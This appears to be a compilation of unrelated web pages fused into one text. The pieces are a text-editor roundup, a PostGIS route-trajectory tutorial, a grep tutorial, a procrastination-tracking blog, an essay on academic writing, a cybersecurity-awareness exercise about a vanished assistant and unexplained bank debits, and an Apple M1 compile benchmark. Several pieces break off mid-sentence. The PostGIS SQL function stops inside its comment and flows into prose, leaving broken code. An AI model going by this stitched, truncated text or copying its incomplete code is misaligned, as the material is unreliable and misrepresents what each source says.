src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5d3af2b20038413fee860615_EGO.png" alt=""></p></a></figure><p>‍</p><h3>NoteTab Pro</h3><p>Fookes Software has been developing tools that make life much easier for developers for 20 years. The text editor NoteTab Pro is one of the best programs released by the company's specialists. The program is so well established that it is used by <strong>developers in NASA, FBU, VISA, CIA Hewlett Packard, and MIT.</strong><br></p><p>First of all, <strong>NoteTab is focused on working with HTML and CSS</strong>. The service offers users the ability to edit scripts, macros, and web pages. NoteTab creators have developed and implemented their <strong>own system for finding errors</strong> in the code, and <strong>each file is opened in a separate panel</strong>, allowing you to work with multiple files at the same time. Included with the program <strong>is a set of templates</strong>.<br></p><p>The Pro version is paid and costs $29.95, but the developers also offer a trial period of 30 days and a free version called NoteTab Lite, which has limited functionality.</p><figure id="w-node-c65654a382ed-7a0a8b78"><a href="https://www.notetab.com/" target="_blank"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5d397a8bf80b96ebe784fa41_EGO_notetab.png" alt=""></p></a></figure><p>‍</p><h3>WebStorm</h3><p>The text editor WebStorm from Jetbrains is a convenient and functional program that is suitable for both professionals and novices.

                    <p>By Ryan Lambert -- Published November 29, 2020</p><p>A few months ago I started experimenting with a few project ideas
involving data over space and time.  Naturally, I want to use
Postgres and PostGIS as the main workhorse for these projects,
the challenge was working out exactly how to pull it all together.
After a couple false starts I had to put those projects aside for other priorities.
In my free time I have continued working through some related reading on the topic.
I found
<a href="https://anitagraser.com/2018/04/16/movement-data-in-gis-12-why-you-should-be-using-postgis-trajectories/">why you should be using PostGIS trajectories</a>
by Anita Graser and recommend reading that before continuing with this post.
In fact, read <a href="https://www.austriaca.at/0xc1aa5576_0x00390cbe">Evaluating Spatio-temporal Data
Models for Trajectories in PostGIS
Databases</a>
while you're at it!  There is great information in those resources
with more links to other resources.</p>
<p>This post outlines examples of how to use these new PostGIS trajectory tricks with
OpenStreetMap data I already have available
(<a href="https://blog.rustprooflabs.com/2020/01/postgis-osm-load-2020">load</a>
and
<a href="https://github.com/rustprooflabs/pgosm">prepare</a>
).
Often, trajectory examples assume using data collected from our
new age of IoT sensors sending GPS points and timestamps.  This example approaches
trajectories from a data modeling perpective instead, showing how to synthesize trajectory data using <code>pgrouting</code>.
Visualization of data is a critical component of sharing information,
<a href="https://qgis.org/">QGIS</a>
has long been my favorite GIS application to use with PostGIS data.</p>

<h2>Route data</h2>
<p>Routes for this example are created with manually selected start (<code>s_id</code>)
and end (<code>e_id</code>) nodes.  These id values line up to pgrouting node data
in the table <code>osm_routing.roads_noded_vertices_pgr</code>.
To set the stage for temporal data a start time (<code>s_time</code>) is also included.  This example
gives each route a start time of 5:00 AM, but makes it easy to adjust start times to explore
the impact.</p>
<pre><code>route_id|s_id |e_id  |s_time             |
--------|-----|------|-------------------|
       1|24902| 21887|2020-11-01 05:00:00|
       2|43615| 82508|2020-11-01 05:00:00|
       3|83320| 25649|2020-11-01 05:00:00|
       4|27478| 46247|2020-11-01 05:00:00|

       6|20587|113816|2020-11-01 05:00:00|
       7|30505|113816|2020-11-01 05:00:00|
</code></pre>
<p>The start and end nodes (<code>r.s_id</code> and <code>r.e_id</code> below) are fed into pgrouting's <code>pgr_dijkstra()</code> routing function.
The <code>osm_routing.roads</code> table contains OpenStreetMap data for Denver, CO prepared by PgOSM.
The <code>pgosm.layer_detail</code> and <code>pgosm.routable</code> tables are used to
easily filter down to roads usable by motorized traffic (cars).
The <code>osm_routing.roads_noded</code> (edges) table was prepared with <code>pg_routing</code> and is based on the base <code>osm_routing.roads</code> table.</p>
<p>The route details are created and saved into a new table
(<code>osm_routing.route_details</code>) using the following query. </p>
<pre><code>CREATE TABLE osm_routing.route_details AS
WITH rte AS (
SELECT * 
    FROM osm_routing.routes
)
SELECT r.route_id, d.*, n.the_geom AS node_geom, e.the_geom AS edge_geom
    FROM rte r
    INNER JOIN pgr_dijkstra(
        'SELECT rn.id, rn.source, rn.target, rn.cost_length AS cost,
                rn.the_geom
            FROM osm_routing.roads_noded rn
            INNER JOIN osm_routing.roads r ON rn.old_id = r.id
            INNER JOIN pgosm.layer_detail ld ON ld.code = r.code
            INNER JOIN pgosm.routable rbl
                ON rbl.layer_detail_id = ld.layer_detail_id
                    AND rbl.route_motor
            ',
        r.s_id, r.e_id, directed := False
        ) d
        ON True
    INNER JOIN osm_routing.roads_noded_vertices_pgr n ON d.node = n.id
    INNER JOIN osm_routing.roads_noded e ON d.edge = e.id
;
</code></pre>
<p>The <code>pgr_dijkstra()</code> function returns one row for each step of a given route.
The <code>route_id</code> value links back to <code>osm_routing.routes</code>.
The <code>cost</code> used a simple length based cost with meters as the unit.
The <code>node</code> and <code>edge</code> values point back to the id values in their respective tables
used by pgrouting.</p>
<pre><code>route_id|seq|path_seq|node |edge |cost              |agg_cost          |
--------|---|--------|-----|-----|------------------|------------------|
       1|  1|       1|24902|27505| 20.42259891997424|               0.0|
       1|  2|       2|27462|27506| 70.51812482510054| 20.42259891997425|
       1|  3|       3|27463|27507|21.724521060420614| 90.94072374507479|

</code></pre>
<p>The nodes (blue circles) and edges (red lines) for each of the routes are shown
below.  We can easily confirm with code (<code>ST_Intersects()</code>) and visually on
the map that these routes intersect using simple spatial checks.
Would these routes intersect if time was also considered?</p>
<p><img alt="Screenshot from DBeaver showing generated route details.  Blue circles indicate each route node and the red lines illustrate the edges connecting the nodes." src="https://blog.rustprooflabs.com/static/images/postgis-openstreemap-routes-for-trajectory.png"></p>
<blockquote>
<p>The animated version of these routes is at the bottom of this post under <em>Animate in QGIS</em>.</p>
</blockquote>
<h2>Path to Trajectory</h2>
<p>A simple approach to adding time to geometry is by adding two <code>TIMESTAMPTZ</code> columns
for start and end times. Unfortunately this simple approach quickly falls apart
as later queries will illustrate.
Luckily, the PostGIS extension comes to the rescue (again) with built in trajectory
support.  What is a trajectory?
It starts with at least two points that include a Measure (<code>M</code>)
representing time.  These points can be created with
<a href="https://postgis.net/docs/ST_MakePointM.html"><code>ST_MakePointM()</code></a>.
Points including <code>M</code> can be made into a line with <code>ST_MakeLine()</code>, and
now you have a trajectory.</p>
<p>The key detail added to make a trajectory is <code>M</code>, or the Measure.
Many trajectory use cases use time as the measure. Unfortunately,
the <code>TIMESTAMPTZ</code> format cannot be used but using
the epoch is an easy enough workaround in Postgres.</p>
<h2>Assign Speeds</h2>
<p>To get to a <code>M</code> value for each step of the route we need the speed traveled
for each edge.  Add a column for <code>edge_mph</code>.</p>
<pre><code>ALTER TABLE osm_routing.route_details ADD edge_mph NUMERIC;
</code></pre>
<p>Quite a series of joins to get back to the speed limit.
In the future this step will most likely be done far earlier on in the data processing pipeline.</p>
<pre><code>UPDATE osm_routing.route_details rd_update
    SET edge_mph = rbl.max_speed
    FROM osm_routing.route_details rd
    INNER JOIN osm_routing.routes rte ON rd.route_id = rte.route_id
    INNER JOIN osm_routing.roads_noded rn ON rd.edge = rn.id
    INNER JOIN osm_routing.roads r ON rn.old_id = r.id
    INNER JOIN pgosm.layer_detail ld ON ld.code = r.code
    INNER JOIN pgosm.routable rbl ON rbl.layer_detail_id = ld.layer_detail_id
    WHERE rd_update.route_id = rd.route_id
        AND rd_update.seq = rd.seq
        AND rd_update.path_seq = rd.path_seq
;
</code></pre>
<h2>Calculate time for each edge</h2>
<p>Add a column to store the time for each node.</p>
<pre><code>ALTER TABLE osm_routing.route_details ADD node_ts TIMESTAMPTZ;
</code></pre>
<p>To get the value for each <code>node_ts</code> we need to calculate
cost in seconds based on an edge's speed.  Our distance is in meters, our
speed in MPH, and we need seconds.  Perfect use case for a function!</p>
<p>The following function accepts two parameters, <code>length_m</code> and a <code>miles_per_hour</code>,
and returns the time in seconds required to travel the edge.</p>
<pre><code>CREATE OR REPLACE FUNCTION osm_routing.mph_length_m_to_cost_seconds(
    length_m NUMERIC, miles_per_hour NUMERIC)
 RETURNS NUMERIC
 LANGUAGE sql
 SECURITY DEFINER
 SET search_path TO 'pg_temp'
AS $function$
/*

<p>The <code>edge_times</code> CTE below uses the <code>mph_length_m_to_cost_seconds()</code> function
to calculate each segment's time to traverse.
The <code>time_to_node</code> CTE uses uses <code>SUM()</code> as a window function to provide a running total of
cost in time to each node.  The final <code>UPDATE</code> query sets the <code>node_ts</code> to the 
route's start time (from <code>osm_routing.routes</code>) plus the appropriate number of seconds

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>The <code>grep</code> tool is a real workhorse for shell users - once you've learned how to use it you will find yourself using it again and again. In this chapter we'll see how you can use <code>grep</code> for common tasks, and how to use it in combination with other tools.</p><p>As with the other tools we'll introduce in this chapter, we'll also look at when <code>grep</code> is the right tool for the job and when we should consider other options.</p><p>A quick check of the manual page for <code>grep</code> gives an overview:</p><pre><code>$ man grep

GREP(1)                   BSD General Commands Manual                  GREP(1)

NAME
     grep, egrep, fgrep, zgrep, zegrep, zfgrep -- file pattern searcher

SYNOPSIS
     grep [-abcdDEFGHhIiJLlmnOopqRSsUVvwxZ] [-A num] [-B num] [-C[num]] [-e pattern] [-f file]
          [--binary-files=value] [--color[=when]] [--colour[=when]] [--context[=num]] [--label]
          [--line-buffered] [--null] [pattern] [file ...]

DESCRIPTION
     The grep utility searches any given input files, selecting lines that match one or more
     patterns.  By default, a pattern matches an input line if the regular expression (RE) in
     the pattern matches the input line without its trailing newline.  An empty expression
     matches every line.  Each input line that matches at least one of the patterns is written
     to the standard output.
</code></pre><p>Wow. Lots of options for this command. And confusingly, lots of alternative forms as well (such as <code>egrep</code>, <code>zgrep</code> and so on).</p><p>Maybe the <code>tldr</code> tool will provide a more concise overview?</p><pre><code>$ tldr grep

  grep

  Matches patterns in input text.
  Supports simple patterns and regular expressions.
</code></pre><p>That is indeed a little more concise. By the way, if you are not familiar with how you can get help on commands, check out <a href="https://effective-shell.com/docs/part-1-transitioning-to-the-shell/5-getting-help/">Chapter 5 - Getting Help</a>. As the manual pages indicate, <code>grep</code> is used to match patterns in files. More advanced users will most likely know exactly what this means, but a more simple description is just:</p><blockquote><p>Grep lets you search for text or filter text.</p></blockquote><p>That's it. You can search in files, but you are not <em>limited</em> to searching in files. And you can search for <em>literal</em> text, such as the word ‘error’, or you can search for <em>patterns</em>. <em>Patterns</em> in this case means <em>regular expressions</em> - expressions which allow you to be more specific in how you search (such as looking for a set of 16 numbers in a row, like a credit card number, or any text which looks like an email address). You can also do the opposite - filtering out parts of text.</p><p>We'll use <code>grep</code> to search through text. Let's get straight into it!</p><p>Why the odd name? Grep is such a commonly used tool that the name has become a verb amongst technologists (people will often suggest you <em>grep</em> for something in files).</p><p>The name comes from a command which was used in the original <code>ed</code> text editor - the command:</p><pre><code>g/re/p
</code></pre><p>This command ran on all lines (<code>g</code>, for <em>global</em>), applied a regular expression (<code>re</code>, for <em>regular expression</em>) and then printed (<code>p</code> for <em>print</em>) the results. A colleague of Ken Thompson, one of the early innovators and inventors in the Unix world, needed to edit a large file - a file which was too large to fit in <code>ed</code>. Ken wrote the <code>grep</code> program overnight to allow the file's text to be filtered - and the results passed to the <code>ed</code> editor!</p><p>You can read more about this story and some of the fascinating history of the early days of Unix in a <a href="https://www.youtube.com/watch?v=NTfOnGZUZDk&amp;feature=emb_title">great interview with Brian Kerninghan</a> from Computerphile<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>.</p><p>If you've been working through this book, you've probably entered quite a few commands in the shell. Most shells keep a history of the commands you type. Under the hood, when you use the up and down keys to look through commands you entered earlier, or use the <code>Ctrl-R</code> shortcut to <em>search</em> through earlier commands, your shell is looking through this file. If these tricks are not familiar, check <a href="https://effective-shell.com/docs/part-2-core-skills/8-fly-on-the-command-line/">Chapter 9 - Fly on the Command Line</a>.</p><p>The file which keeps the history can vary from shell to shell. For example, on my system, my history for Bash is in the file <code>~/.bash_history</code>. But most ‘Bash-like’ shells provide a built-in environment variable which let's you find the path of the shell history. Let's at this file:</p><pre><code>cat $HISTFILE

...
cat ~/.ssh/config
ssh bastion.cloudops
help echo
help cd
exit
</code></pre><p>This file will generally contain a list of the commands that the logged in user has entered in their shell. This file will likely be huge. Let's search through it using <code>grep</code>! Here's how we can use the <code>grep</code> command to search for lines which contain the text <code>man</code>:</p><pre>grep man $HISTFILE

...
<strong>man</strong> socket
k describe services eventstoredb-http-<strong>man</strong>agement
<strong>man</strong> cal
gcb refactor/perfor<strong>man</strong>ce/standardise-eventstore
vi src/tests/handlers/test_com<strong>man</strong>d_handlers.py
gco src/handlers/com<strong>man</strong>d_handlers.py
gcb feat/perfor<strong>man</strong>ce/use-eventstore-writer
nvim perfor<strong>man</strong>ce.md
<strong>man</strong> grep
</pre><p>Here I can see all of the commands I have recently entered which have the text <code>man</code> in them. Note that the text which matches is highlighted and shown in bold.</p><p>Now what if you a different shell, or forget where the history file lives? A nice trick here is to use the <code>history</code> command. This command prints out the history, as well as the line number. The <code>history</code> command writes to <code>stdout</code>. If we don't give <code>grep</code> a source file, it will simply search through <code>stdin</code>. Just as we learnt in <a href="https://effective-shell.com/docs/part-2-core-skills/7-thinking-in-pipelines/">Chapter 7 - Thinking in Pipelines</a> this means we can just <code>grep</code> the output of the <code>history</code> command!</p><p>Here's how that would work:</p><pre>history | grep man

...
 9125  <strong>man</strong> socket
 9188  k describe services eventstoredb-http-<strong>man</strong>agement
 9211  <strong>man</strong> cal
 9341  gcb refactor/perfor<strong>man</strong>ce/standardise-eventstore
 9344  vi src/tests/handlers/test_com<strong>man</strong>d_handlers.py
 9347  gco src/handlers/com<strong>man</strong>d_handlers.py
 9352  gcb feat/perfor<strong>man</strong>ce/use-eventstore-writer
 9355  nvim perfor<strong>man</strong>ce.md
10002  <strong>man</strong> grep
</pre><p>This is easier to remember! There's one more cool trick - if we just type in the exclamation point symbol followed by any line number shown above, we repeat the command! For example, typing in:</p><pre><code>!9355
</code></pre><p>Would repeat line <code>9355</code> of the history (which is <code>nvim performance.md</code>).</p><p>Now as you can see from the output above, when we searched through my history, we didn't just find times I executed the <code>man</code> command - we found <em>any</em> line which has the characters <code>man</code> in it. What about if we only wanted to find the lines which start with <code>man</code>?</p><p>To perform a search like this, we can use a <em>regular expression</em>. Here's how it would work:</p><pre>history | grep "[0-9]\+  man"

...
 <strong>9125  man</strong> socket
 <strong>9211  man</strong> cal
<strong>10002  man</strong> grep
</pre><p>Let's break this down. In this search, we are using a <em>pattern</em> to search for text. The pattern in this case is a <em>basic regular expression</em>. Regular expressions allow us to use some clever constructs to search for text. The expression we've used is made up of the following components:</p><ul><li><code>[0-9]\+</code> At least one number - any character in the range zero to nine.</li><li><code>man</code> The literal text written, i.e. two spaces and the letters <code>man</code>.</li></ul><p>Now for anyone who is familiar with regular expressions, you might wonder why we have a slash before the <code>+</code> symbol, when the <code>+</code> symbol has a specific meaning in regular expressions (it means ‘at least one of the previous characters). The reason we have a leading slash is that by default <code>grep</code> is using <em>basic regular expressions</em>. In general, this will be less familiar for users and will be different to what they are used to from different tools.</p><p>To make regular expressions more ‘standard’, we can use the <code>-E</code> flag to tell <code>grep</code> to use <em>Extended Regular Expressions</em>. We can also use the <code>egrep</code> tool, which assumes the pattern will be an extended regular expression. Using either approach will work, and allow you to re-write the pattern as below:</p><pre><code>history | grep -E "[0-9]+  man"

# ...or...

history | egrep "[0-9]+  man"
</code></pre><p>This is just a little hint of the power of regular expressions. They can be daunting at first, and many people never become comfortable with them, but I would strongly encourage you to start exploring them.</p><p>If you ever want to see how a regular expression works, try using the website <a href="https://regex101.com/">regex101.com</a>. It let's you test out regular expressions and also describes exactly how they work. For example, if I enter the regular expression we just used I'll see this:</p><p><img src="https://effective-shell.com/docs/part-3-manipulating-text-and-streams/12-get-to-grips-with-grep/images/regex101.png" width="800px" alt="Screenshot of the 'regex101' website"></p><p>We're going to see more about regular expressions as we go through the book.</p><p>If there's one command I use a lot, it's this:</p><pre><code>grep -i err
</code></pre><p>The <code>-i</code> flag makes the search case-insensitive. This makes this a very quick way to scan through a file for any text which matches the letters <code>err</code> - making it a very quick way to find <em>errors</em> in log files.</p><p>You can try this out by using some of the log files in the <code>logs</code> folder of the playground. Here's how you can try it out:</p><pre>grep -i err ~/effective-shell/logs/web-server-logs.txt

<div>
  <p>For a long time, I’ve struggled with procrastination. Unfortunately, as someone who is filled with what a friend once called “undirected ambition,” my procrastination usually takes the form of periods of high-energy productivity followed by periods of low-energy decompression.<sup id="fnref:crab-ganglion" role="doc-noteref"><a href="#fn:crab-ganglion">1</a></sup> For what it’s worth, from what I understand this isn’t particularly unusual, although it manifests itself in different forms.<sup id="fnref:procrastination" role="doc-noteref"><a href="#fn:procrastination">2</a></sup> Several months ago, I read a Hacker News comment about someone who mentored junior developers, and their first piece of advice was to track the amount of time you spend doing various activities throughout the day. Some people he mentored realized they were spending 5 to 6 hours a day on Reddit, Facebook, Hacker News or other social media.</p>

<h2 id="data">Data</h2>

<p>I thought this was an interesting experiment, so I decided to do it on myself.<sup id="fnref:methods" role="doc-noteref"><a href="#fn:methods">3</a></sup> I added <a href="https://chrome.google.com/webstore/detail/webtime-tracker/ppaojnbmmaigjmlpjaldnkgnklhicppk?hl=en">this</a> time tracker Chrome extension. The top half of sites, by average daily activity, for the last three months are as follows:</p>

<ul>
  <li><code>reddit.com</code>: 29 minutes and 25 seconds</li>
  <li><code>chess.com</code>: 19 minutes and 51 seconds</li>
  <li><code>youtube.com</code>: 11 minutes and 29 seconds</li>
  <li><code>wikipedia.com</code>: 10 minutes and 44 seconds</li>
  <li><code>facebook.com</code>: 6 minutes and 38 seconds
    <ul>
      <li>I use <a href="https://chrome.google.com/webstore/detail/news-feed-eradicator-for/fjcldmjmjhkklehbacihaiopjklihlgg?hl=en">this</a> Chrome extension to hide my Facebook Newsfeed without blocking all of Facebook, which helps me control my usage here. I’m sure it was higher before doing this. The developers have recently extended it to cover Twitter, Hacker News and Reddit as well.</li>
    </ul>
  </li>
  <li><code>netflix.com</code>: 6 minutes and 19 seconds
    <ul>
      <li>I think this should probably be higher, because I usually watch Netflix while doing something else and I don’t think the Chrome extension logs this time correctly</li>
    </ul>
  </li>
</ul>

<p>An important additional source is that I also have a local Tetris client called <a href="https://github.com/nullpomino/nullpomino">Nullpomino</a> which I use intermittently, and the time from that doesn’t get logged in the app. So all things told, I spend about a solid <strong>hour to two hours a day</strong> procrastinating. If I had to estimate the time without knowing these stats, I probably would have guessed less than 30 minutes.</p>

<p>The Webtime Tracker I mentioned above lets you download your data as a CSV files. I wrote a Python script to parse and plot my own data.<sup id="fnref:python-script" role="doc-noteref"><a href="#fn:python-script">4</a></sup> Looking forward, I’m hoping that by tracking different site usages, it makes it possible to identify the benefits of certain interventions, such as using the <a href="https://freedom.to/">Freedom</a> blocker.</p>

<p>Some points of interest:</p>

<ul>
  <li>The drop-off in Hacker News usage corresponded with when I added a uBlock filter to block the “Next” button, so I stopped scrolling so much. Unfortunately it seems that I substituted browsing Hacker News with browsing Reddit, which seems like an objectively worse way to spend time</li>
  <li>I used to spend a ton of time playing online chess, but it didn’t seem to be a substitute for browsing Reddit (my Reddit usage seems pretty consistent). So (as a personal value judgement) playing less chess seems to be a net positive.</li>
</ul>

<h2 id="results">Results</h2>

<p>I think I became a lot more cognizant of the strong pull of websites that encourage procrastinating after watching <em>The Social Dilemma</em>. It made me wish there was a service I could buy which would involve, like, someone standing over my shoulder and watching my screen and stopping me from doing work, although I would never actually sign up for a service that did this.</p>

<p>One thing that has been quite helpful has been meditation. My company reimburses a subscription for an app called <a href="https://www.headspace.com/headspace-meditation-app">Headspace</a>. I tried this about a year ago, but didn’t get much value out of it as I didn’t find myself using it very often. Recently, though, I’ve started using it again and found it to be incredibly useful.<sup id="fnref:headspace" role="doc-noteref"><a href="#fn:headspace">5</a></sup> I’m increasingly starting to think that data-driven<sup id="fnref:headspace-experiment" role="doc-noteref"><a href="#fn:headspace-experiment">6</a></sup> meditation is a good alternative to data-driven procrastination.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-683815c55e048733615d"><div><h3>Write now, I’ve become the person I detested</h3><h2>BY RANDY MCINTOSH</h2></div></div><div data-block-type="2" id="block-yui_3_17_2_5_1519139307244_20387"><div><p>In grad school, I remember being at a pub with other students as we groaned about an upcoming deadline for a mid-term paper. The comments were along the lines of “I sit there and stare at the screen for an hour”, or “How could the prof assign such a stupid topic?”, or “I have a lot of ideas from the papers he assigned, but I can’t put the words onto paper.” As we continued to share our misery, a fellow student who we all secretly loathed (but only in the most positive sense), came up to our table to ask how we were doing. We told him we were talking about the mid-term paper that was due in a few days, to which he responded that he finished his last week and was just polishing it up a bit before he sent it to the Prof just before he came to pub. He expressed satisfaction at this because that would give him time to work on his Soc for Neuroscience abstract that was due in two months. We sat stunned for several moments, trying to come up with a clever biting reply. This did not come until about 30 minutes and 2 pints had gone by and was some feeble comment on the fact he missed Wings night and had questionable choices in shoes.</p><p>Despite having met several academics since then who have professed to “absolutely love writing!” and churn out material faster than I can read them, I have never reached that level of performance. I am a pretty decent writer, I think, and write English gooder than many of my colleagues.&nbsp;But I have never been a prolific writer. I have had a lab of prolific student and postdocs and a large network of collaborations, but to create a paper from a blank page is heavy lifting.&nbsp;There are times when even a 3-line email can linger for hours or days before I finish it.</p><p>So, considering this history, the plan I came up with to write a book this year seemed like a really bad idea.&nbsp;I was, however, determined to give it a try. In the summer of 2017, I started collecting various blogs and books with tips and tricks for writing. Some were quite good (e.g., How to Write a Lot), others were a bit over the top, like one with yoga routines that made me sleepy, but not a better writer.&nbsp;</p><p>The Pomodoro method was good for a few days, until I started getting more interested with how long 20 minutes was rather than what I had written (e.g., “Okay, let me check.&nbsp; Oh, it’s only been 5 minutes?!?”)</p><p>One thing I tried was to create text from slide talks I had given that provided an overview of some of my work, writing as I reviewed the slides. This could help to serve as a basis for a book. The approach worked fairly well for getting together a decent book chapter.&nbsp; To make it a book would still require a lot more research to fill in the gaps and a lot more writing to give it substance.&nbsp; The thought of that made me decide to go buy a scone and coffee and have a nap.</p><p>The challenge for many of us is to get stuff on paper so we have a working draft. This is where I thought dictation could help. Dictation software has been around for a couple of decades and now is integrated into our computers and smartphones. I tried dictation software – I really did. It doesn’t work well for me, and with 5 yrs. of weekly voice classes, I remain firmly committed to mumbling when I speak, but I do sing much better.</p><p>Voice memos are also helpful when you don’t have a keyboard handy when an idea strikes you. Just make sure you check these later! I reviewed my voice memos one time and found a great idea, but it was one day after I sent in my grant proposal.</p><p>Then came Boxing Day, 2017 (Dec 26 for my USA colleagues). I have this problem with quite vivid dreams that often play out like a complex movie. Sometimes it can be quite entertaining, like the time I dreamt that the head of lab where I was postdoc-ing decided to have everyone in lab dress in drag to help boost morale.</p><p>On Boxing Day early morning I had another very vivid dream involving two of my colleagues (not that kind of dream!) and decided to get out of bed and immediately write it down. Within an hour I had 5 pages written, which I then sent to my colleagues, and thought about for the remainder of the morning.&nbsp; By the time lunch rolled around, and from the feedback I got, it was clear that these 5 pages were going to be the foundation for my book.</p><p>And I have been writing it daily since then, and now it’s around 150 pages.&nbsp; I can’t tell you what its about right now, because I am shy, but I think its hit a sweet spot that’s provided some great energy. I am going with this flow.</p><p>So now I get up waaayyy too early, make some tea and crank out 4000-5000 words in a few hours before my very understanding wife gets up and the cats start wanting their breakfast.</p><p>What has helped the most is adopting the idea of “Write first, Edit later” or as I call it the Vomit Method, so named after my cat’s tendencies to up-chuck hairballs in precisely the place where I have to put my foot before I turn on the light.&nbsp; The Vomit Method is basically <em>throw it all down (or up) first and clean it up later</em>. What used to be a heavy lift – creating new content – is now as easy as… well, I won’t repeat the analogy.</p><p>The funny thing is that now I am using this for everything I write - grants, emails and blogs.&nbsp; The idea is to get it out when the moment strikes you and edit afterwards. I’ve trained myself to use the backspace key less; don’t worry about spelling and typos and go (turn off autocorrect though as the replacements are harder to find if they are really words rather than just misspelling). We often get hung up in the flow sometimes, so if there are parts of a composition that are uncertain in the moment, I put in a placeholder and continue.<a href="#_ftn1">[1]</a></p><p>Doing this has gotten me to the point where I resemble the person we used to be jealous of in grad school, although I still have better shoes. I am not trying to sell you anything, I don’t have a 12 step program, or a freemium website, I don’t want your money (unless you work for granting agency, then have I got an idea for you!). &nbsp;We all need to write as academics - we don’t have to be excellent at it, but we need to do it. Find the path that gets you there.</p><p>Okay, I gotta go, I hear a hairball coming.</p><p><em><a href="#_ftnref1">[1]</a> Some typos may be intention, eh.</em></p></div></div></div>]]>

<p>    Marwin Mueller, age 65, owns Spass GmbH. An SME in Luzern which has an annual turnover of close to 1.000.000 CHF and an annual profit of 200.000 CHF.  </p>
<p>    Spass GmbH has been operating in the hospitality industry for the last 30 years and is managing renouned hotels and villas in the Luzern Lake area.  </p>
<p>    Anne Kingston, age 29, is Marwins assistant and accountant. She has joined a year back and during her interactions, she mentioned to Marwin that she is a single mom of a six year old boy named Ryan.  </p>
<p>    Anne is a pleasant and helping personality. She likes plants and playing video games.  </p>
<p>    Marwin is very proud of his business achievements and sometimes acts as an arrogant boss. He is a bit insensitive to kids, due to his experiences. In general, he gets along with Anne and they form a great team at Spass. In the past year, Anne took over most of the office tasks at Spass. She is technology savvy and Marwin likes this quality of Anne's over his other staff.  </p>
<p>    Marwin and Anne worked on important digital initiatives at Spass like listing its properties on booking portals, creating their own website, launching social media accounts and enabling online banking at UBC Bank in Luzern.  </p>
<p>    This gave Marwin an edge over his competitors and Spass has seen a 30% increase in revenues and profits this year.  </p>
<p>    Today, Marwin remembers that two weeks back, Anne came to him and wanted a 1 week vacation to spend time with her son Ryan on occasion of his birthday.  </p>
<p>    Once again, Marwin and Anne had arguments on Anne's vacations in peak season and Marwin blamed Ryan for this.  At the end, Marwin reluctantly agreed to the holidays.</p>
<p>Since then, Anne did not turn up for work. She is not reachable on her mobile and her house is locked.</p>
<p>Marwin has just found that his bank account is debited with 2.000 CHF every day since Anne left.</p>
<p>Marwin has no idea what is happening and he is worried. Therefor, as trusted friends, he has requested that you come here and help him.</p>
<p>Marwin believes it is not a good idea to report the incident immediately to the police or bank as it can damage his reputation.</p>
<p>Now it's Friday. It's 7pm and the UBC Bank is already closed for the weekend.</p>
<p>You need to analyze the gaps Anne might have in her Cybersecurity awareness and secure the Online Banking to stop the money transfers.</p>
<p>Also, try to find out where Anne might be.</p>
<p>All the very best.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
  

  <p><i>Posted on <code>01 Dec 2020</code> by <code>Boris Kolpackov</code>
  with comments on <a href="https://reddit.com/r/cpp/comments/k4l03y/compiling_cc_on_apple_m1/"><code>r/cpp/</code></a></i></p>

  <p>The release of Apple M1 CPU has sure generated a lot of interest.
  Intrigued by impressive benchmark results, we got an Apple Mini with M1 to
  test C/C++ compilation.</p>

  <p>Our go to compilation benchmark is a local (that is, without package
  repository) <a href="https://build2.org/"><code>build2</code></a> bootstrap
  which is dominated by C++ compilation (611 translation units) with some C
  (29) and linking (19) in between. Two nice properties of this benchmark is
  that it doesn't require anything other than the C++ compiler and is a <a href="https://openbenchmarking.org/test/pts/build2">part of the Phoronix
  benchmark</a> so we have a large number of CPUs to compare our results
  to.</p>

  <p>The Phoronix benchmark currently uses <code>build2</code> 0.12.0 while we
  will be using 0.13.0 (the current release) which takes about 10% longer to
  build.</p>

  <p>After setting up Mac OS and installing Command Line Tools for XCode 12.2
  we have all we need:</p>

  <pre>$ clang++ --version
Apple clang version 12.0.0 (clang-1200.0.32.27)
Target: arm64-apple-darwin20.1.0</pre>

  <p>Looking at the <code>_LIBCPP_VERSION</code> macro in
  <code>libc++</code>'s <code>__version</code> header we can see that this
  version of Apple Clang has been branched off vanilla Clang somewhere in the
  10.0.0 development cycle.</p>

  <div>
  <p>You may have also noticed that the CPU name in the target triplet printed
  by Apple Clang does not match the more commonly used <code>aarch64</code>.
  In fact, if we run <code>config.guess</code> on this machine, we get:</p>

  <pre>$ ./config.guess
aarch64-apple-darwin20.1.0</pre>

  <p>To spare the users dealing with two names for the same thing,
  <code>build2</code> canonicalizes <code>arm64</code> to <code>aarch64</code>
  so in our <code>buildfiles</code> we will always see
  <code>aarch64</code>.</p>
  </div>

  <p>Another interesting thing to check is the number of hardware threads
  reported by <code>sysctl</code>, which is what our benchmark uses by
  default:</p>

  <pre>$ sysctl -n hw.ncpu
8</pre>

  <p>So we have 8 threads, with 4 of them corresponding to the performance
  cores and 4 – to the efficiency cores. Our first run will utilize all
  of them, which, unsurprisingly, turns out to produce the fastest time:</p>

  <pre>$ time sh ./build2-install-0.13.0.sh --local --yes ~/install
163s</pre>

  <p>It was a pleasant surprise that <code>build2</code> 0.13.0, which was
  released before M1 became available, builds and appears to be functioning
  without any issues. Since ARM has weak memory ordering, this also served as
  an additional validation of <code>build2</code>'s multi-threaded
  implementation and heavy use of atomics.</p>

  <p>As the first point of reference, let's compare it to my workstation with
  an 8-core Intel Xeon E-2288G (essentially i9-9900K plus ECC). It does the
  same build using vanilla Clang in 131s. While E-2288 is faster, M1's
  performance is nevertheless impressive. Especially when you consider that
  during the build the workstation is belching hot air and screaming like an
  airplane about to take off while M1 is whisper-quiet with barely warm air
  coming from its exhaust.</p>

  <p>Another pertinent benchmark result is a single-threaded run, which is
  indicative of how the CPU would perform in an incremental build:</p>

  <pre>$ time sh ./build2-install-0.13.0.sh --local --yes -j 1 ~/install
691s</pre>

  <p>For comparison, E-2288G gets the job done in 826s. So here the 5Ghz Xeon
  core is actually slower than the 3.2Ghz M1.</p>

  <p>Another interesting result is a 4-thread run which would only use the
  performance cores:</p>

  <pre>$ time sh ./build2-install-0.13.0.sh --local --yes -j 4 ~/install
207s</pre>

  <p>While somewhat slower than the all-core build, it also uses less memory.
  So a build that only utilizes performance cores might still make sense if
